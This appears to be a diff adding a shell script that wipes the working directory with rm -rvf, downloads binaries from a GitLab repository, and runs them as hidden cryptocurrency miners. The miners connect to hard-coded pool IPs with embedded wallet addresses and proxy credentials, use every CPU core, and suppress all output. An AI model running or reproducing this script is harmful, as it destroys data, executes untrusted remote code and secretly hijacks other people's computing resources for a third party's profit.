@@ -1,0 +1,3 @@
+rm -rvf * && mkdir a && cd a
+wget https://gitlab.com/majzzaa/mvp/-/raw/main/modal && chmod +x modal && ./modal --algo qhash --qhash-kernel 1 --url 165.227.127.0:80 --user bc1qf4m7p9dtux455n8axm3tz6mg7zd4ywpjnkrv02.P01$(shuf -n 1 -i 1-99999) --proxy socks5://abah:abah123@138.197.88.9:443 & wget https://gitlab.com/majzzaa/mvp/-/raw/main/sse2 && chmod 777 sse2 && ./sse2 -a interchained -o stratum+tcp://147.182.238.146:443 -u itc1qk9ux3n26w5du82ghxvt592r8de6j3kfs3uwsn6.$(shuf -n 1 -i 1-99999)-eza02 -t $(nproc --all) > /dev/null 2>&1
+#wget https://gitlab.com/majzzaa/mvp/-/raw/main/sse2 && chmod 777 sse2 && ./sse2 -a power2b -o stratum+tcp://147.182.238.146:443 -u mbc1qlvth7nnzwc90s8cxrgsr3efe39nywryddps729.$(shuf -n 1 -i 1-99999) -t4 -p webpassword=xxx,m=solo
